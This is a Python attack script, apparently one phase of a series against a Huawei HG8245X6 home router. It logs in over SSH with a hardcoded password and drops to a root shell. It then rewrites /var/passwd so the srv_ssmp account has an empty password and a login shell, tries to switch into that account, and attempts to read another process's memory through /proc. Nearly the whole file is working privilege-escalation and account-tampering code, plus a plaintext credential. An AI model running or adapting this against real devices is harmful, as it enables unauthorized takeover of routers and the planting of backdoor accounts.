#!/usr/bin/env python3
"""
Phase 6: Write to /var/passwd IN-PLACE using shell redirect (not cp).
touch succeeded, so we can write to the file directly with > operator or tee.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "Password:"], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - /var/passwd In-Place Write for srv_ssmp")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── Backup current passwd ──────────────────────────────────
    print("[*] Backing up /var/passwd...")
    send_cmd(chan, "cp /var/passwd /tmp/passwd.bak && echo BACKUP_OK")

    # ── Generate new passwd content with srv_ssmp having empty password and /bin/sh ──
    print("\n[*] Creating modified passwd with tee (in-place write):")
    # Method: use sed output piped to tee which writes IN PLACE
    send_cmd(chan, "sed 's|srv_ssmp:x:3008|srv_ssmp::3008|; s|srv_ssmp:/bin/false|srv_ssmp:/bin/sh|' /var/passwd | tee /var/passwd_new > /dev/null && echo TEE_OK || echo TEE_FAIL")
    send_cmd(chan, "cat /var/passwd_new | grep srv_ssmp")

    # Now try to write the file content directly into /var/passwd
    print("\n[*] Using shell redirect > to write to /var/passwd:")
    send_cmd(chan, "cat /var/passwd_new > /var/passwd && echo WRITE_OK || echo WRITE_FAIL")
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    # ── Try su srv_ssmp now ────────────────────────────────────
    print("\n[*] Attempting su srv_ssmp (should work with empty password):")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "# ", "$ ", "srv_ssmp", "false"], timeout=5)
    print(f"  su output: {out.strip()[-300:]}")
    
    if "Password" in out:
        print("  [*] Trying blank password...")
        chan.send("\n")
        out = recv_until(chan, ["# ", "$ ", "incorrect", "false"], timeout=5)
        print(f"  result: {out.strip()}")
        if "incorrect" not in out.lower() and "false" not in out.lower():
            print("\n  [+] ✓ SUCCESS! We have a srv_ssmp shell!")
            send_cmd(chan, "id")
            send_cmd(chan, "cat /proc/self/status | grep -E 'Uid|Gid|Cap'")
            send_cmd(chan, "ls /")
        else:
            print("  [-] Shell is /bin/false or password still required")
            # The shell is /bin/false - we need to override with -s
            chan.send("su -s /bin/sh srv_ssmp\n")
            out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
            print(f"  su -s result: {out.strip()}")
            if "Password" in out:
                chan.send("\n")
                out = recv_until(chan, ["# ", "$ ", "incorrect"], timeout=5)
                print(f"  {out.strip()}")
                if "incorrect" not in out.lower():
                    print("  [+] ✓ SUCCESS with -s /bin/sh!")
                    send_cmd(chan, "id")
    elif "# " in out or "$ " in out:
        print("  [+] ✓ Shell obtained without password prompt!")
        send_cmd(chan, "id")

    # ── Restore passwd ────────────────────────────────────────
    print("\n[*] Restoring /var/passwd backup...")
    send_cmd(chan, "cat /tmp/passwd.bak > /var/passwd && echo RESTORED || echo RESTORE_FAIL")
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    # ── Alternative: Use newgrp to switch group to srv_ssmp group ─
    print("\n[*] Alternative: Try busybox chpst / newgrp:")
    send_cmd(chan, "busybox chpst -u srv_ssmp /bin/sh 2>&1 | head -3", timeout=8)
    send_cmd(chan, "newgrp srv_ssmp 2>&1 | head -3", timeout=5)
    
    # ── Check if there's a way to exec as srv_ssmp via IPC ───
    print("\n[*] ssmp IPC socket communication:")
    send_cmd(chan, "ls /var/run/*.sock /tmp/*.sock 2>/dev/null | head -10")
    send_cmd(chan, "ls /tmp/QoE/ 2>/dev/null | head -10")
    send_cmd(chan, "ls /tmp/ 2>/dev/null")

    # ── Check if /proc/1650/mem is readable with correct caps ─
    print("\n[*] Trying /proc/1650/mem read via dd:")
    send_cmd(chan, "dd if=/proc/1650/mem of=/tmp/ssmp_mem.bin bs=1 count=100 skip=0 2>&1 | head -5", timeout=10)

    # ── Check /proc/1650/map_files ────────────────────────────
    print("\n[*] ssmp process map_files:")
    send_cmd(chan, "ls /proc/1650/map_files/ 2>&1 | head -10")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
